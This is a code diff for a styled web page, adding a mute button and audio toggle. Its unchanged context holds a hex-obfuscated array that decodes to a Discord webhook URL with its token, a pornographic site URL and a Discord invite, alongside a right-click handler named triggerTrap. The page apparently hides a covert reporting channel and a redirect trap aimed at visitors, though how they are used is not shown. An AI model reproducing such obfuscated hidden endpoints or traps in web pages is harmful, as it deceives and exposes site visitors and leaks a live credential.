@@ -16,6 +16,7 @@
         }
         
         * { cursor: none !important; }
+        
 
         /* --- NEW LOGO ANIMATIONS --- */
         @keyframes logoFloat {
@@ -153,6 +154,12 @@
             border-bottom: 1px solid var(--border-ui);
         }
 
+        #mute-control:hover {
+        background: var(--cf-yellow);
+        color: #000;
+        box-shadow: 0 0 15px var(--cf-yellow);
+        }
+
         .ui-main { flex: 1; display: grid; grid-template-columns: 320px 1fr 320px; padding: 20px; gap: 20px; overflow: hidden; }
         .side-panel { background: var(--panel-bg); border: 1px solid var(--border-ui); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }
 
@@ -198,6 +205,12 @@
     </style>
 </head>
 <body id="main-body" oncontextmenu="triggerTrap(); return false;">
+
+<div id="mute-control" onclick="toggleMute()" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; cursor: none; background: rgba(0,0,0,0.5); padding: 10px; border: 1px solid var(--border-ui); color: var(--cf-yellow); width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; transition: 0.3s;">
+    <i id="mute-icon" class="fas fa-volume-up"></i>
+</div>
+
+
 
 <div id="custom-cursor"></div>
 
@@ -308,6 +321,34 @@
     const cursor = document.getElementById('custom-cursor');
     const blipSfx = document.getElementById('sfx-blip');
     
+    let isMuted = false;
+
+function toggleMute() {
+    isMuted = !isMuted;
+    
+    const bgm = document.getElementById('bgm');
+    const gae = document.getElementById('gae');
+    const blip = document.getElementById('sfx-blip');
+    const icon = document.getElementById('mute-icon');
+
+    // Toggle Mute on all elements
+    bgm.muted = isMuted;
+    gae.muted = isMuted;
+    blip.muted = isMuted;
+
+    // Update Icon
+    if (isMuted) {
+        icon.className = "fas fa-volume-mute";
+        addLog("Audio Systems Offline.");
+    } else {
+        icon.className = "fas fa-volume-up";
+        addLog("Audio Systems Online.");
+    }
+    
+    // Play a blip if unmuting
+    if (!isMuted) playBlip();
+}
+
     
     const _0x1a2b = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x36\x33\x39\x39\x32\x30\x39\x34\x39\x32\x39\x37\x31\x39\x33\x35\x32\x2f\x33\x52\x4c\x6f\x56\x6e\x5f\x42\x6e\x62\x59\x6e\x6f\x48\x48\x54\x65\x45\x31\x58\x45\x58\x54\x54\x2d\x66\x6b\x4e\x54\x69\x6f\x7a\x6b\x6e\x39\x71\x46\x4e\x44\x66\x32\x6c\x59\x30\x57\x48\x6a\x49\x58\x66\x35\x73\x70\x48\x7a\x42\x6e\x69\x55\x63\x5f\x31\x79\x52\x46\x39\x61\x4c", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x6f\x72\x6e\x68\x75\x62\x2e\x63\x6f\x6d", "https://discord.gg/ZrYhejg2kg"];
 
